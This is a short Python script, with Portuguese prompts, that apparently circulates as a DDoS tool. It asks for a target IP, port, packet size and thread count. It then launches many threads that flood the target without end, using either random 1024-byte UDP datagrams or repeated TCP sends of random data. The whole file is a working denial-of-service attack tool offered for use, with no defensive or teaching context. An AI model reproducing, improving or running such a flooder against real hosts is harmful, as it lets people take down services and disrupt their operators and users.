#!/usr/bin/env python3
#Code by LeeOn123
#Codigo melhorado 2x por Elbielzinho
import sys
import os
import time
import random
import socket
import threading
#Codigo do Tempoo
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

os.system("figlet DDoS/Packet")
print("")
print("--> Script Melhorado V2 <--")
print("--> Criador Elbielzinho <--")
print("")
ip = str(input(" Host/Ip:"))
port = int(input(" Port:"))
print("")
choice = str(input(" Packet(y/n):"))
ddos = str(input(" DDoS(y/n):"))
print("")
times = int(input(" Tamanho de Packet/DDoS:"))
threads = int(input(" Potencia:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(" ENVIANDO PACKET COM SUCESSO")
			print("")
		except:
			print("DDoS/Packet ERROR")
			print("The attack failed")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(" ENVIANDO DDOS COM SUCESSO")
			print("")
		except:
			s.close()
			print("DDoS/Packet ERROR")
			print("The attack failed")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()